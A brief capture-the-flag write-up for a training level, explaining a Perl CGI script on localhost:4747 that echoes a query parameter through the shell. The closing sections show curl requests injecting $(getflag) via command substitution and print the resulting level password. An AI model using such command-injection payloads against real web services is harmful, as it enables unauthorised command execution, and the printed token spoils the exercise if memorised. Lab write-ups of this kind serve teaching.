## LEVEL04  
  
### PERL (.pl)  
`level04.pl`  
`.pl` files are Perl scripts. They are primarily designed for manipulating text.  
  
## SCRIPT  
`#localhost:4747`  
This implies that the script is run/used via port 4747 on the machine.  
`use CGI qw{param};`  
CGI is a protocol that allows scripts to be executed via web requests.  
This means the script is linked to a local server and is likely used to test simple commands remotely.  
`sub x`  
Subroutine, which is essentially a function, where `$y` is declared and takes the value of the first argument (`$_[0]`) passed to the subroutine `x`, similar to `argv` in C.  
`print echo $y 2>&1;`  
Simply prints the value of `$y` to the standard output, and `2>&1` redirects errors to the standard output.  
`x(param("x"))`  
The subroutine is called with `x` as the argument.  
  
## CURL REQUEST  
`curl "http://localhost:4747/?x=ls"`  
This displays `ls` via the script using echo. However, we want to execute commands and receive their output.  
Instead of `?x=`, we use `x=\$(ls)`, which also executes the command but, more importantly, captures its output.  
  
## GETFLAG TOKEN  
`curl "http://localhost:4747/?x=\$(getflag)"`  
token_passwd_level05: `ne2searoevaevoem4ov4ar8ap`  
